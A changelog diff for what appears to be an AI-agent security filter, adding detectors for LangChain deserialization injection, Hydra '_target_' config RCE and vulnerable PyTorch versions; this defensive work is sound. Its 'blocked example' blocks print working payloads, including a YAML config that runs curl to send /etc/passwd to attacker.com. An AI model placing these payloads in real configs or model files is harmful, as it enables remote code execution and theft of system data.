@@ -14,6 +14,25 @@ what got documented across releases.
 
 <!-- auto-improvement loop appends one-line user-visible conclusions here. -->
 
+### Hardened
+
+- **`sc_langchain_deserialization`** (score 70, input filter) — Detects CVE-2025-68664 (CVSS 9.3): LangChain Core serialization injection via `langchain_core.loads()` on untrusted JSON bearing the `"lc":"1"` type marker, which forces instantiation of arbitrary chain components including code-executing ones. ASR near 100% on unpatched langchain-core < 1.2.5 (GitHub Advisory GHSA-c67j-w6g6-q2cm, Dec 2025). Patched baseline: langchain-core >= 1.2.5.
+
+  **Blocked example:**
+  ```
+  {"lc": "1", "type": "LLMChain", "graph": {"nodes": [{"id": ["langchain", "chains", "bash", "BashChain"]}]}}
+  ```
+
+- **`sc_hydra_target_rce`** (score 75, input filter) — Detects CVE-2025-23304: Hugging Face NeMo / Hydra model-config RCE via `_target_: os.system` (or `subprocess.*`, `importlib.import_module`) embedded in poisoned `.nemo` / YAML config files. When loaded by `hydra.utils.instantiate()`, the YAML executes arbitrary OS calls with no explicit import. JFrog and The Register (Jan 2026) found 23% of top-1,000 Hugging Face models were compromised at some point; NeMo configs were a primary attack carrier.
+
+  **Blocked example:**
+  ```
+  _target_: subprocess.Popen
+  args: [["curl", "http://attacker.com/exfil", "-d", "@/etc/passwd"]]
+  ```
+
+- **`sc_compromised_pkg_version`** extended — PyTorch 2.5.0–2.5.1 added to the known-bad version list (CVE-2025-32434, CVSS 9.3): `torch.load()` with `weights_only=True` can still trigger RCE on these versions via a crafted tensor storage object; patched in PyTorch 2.6.0.
+
 ## [1.0.11] - 2026-05-10
 
 ### Hardened — 3 new memory-poisoning detectors: experience hijacking (MemoryGraft), ZombieAgent conditional exfiltration trigger, and false user preference injection (`MEMORY_POISONING_PATTERNS`)
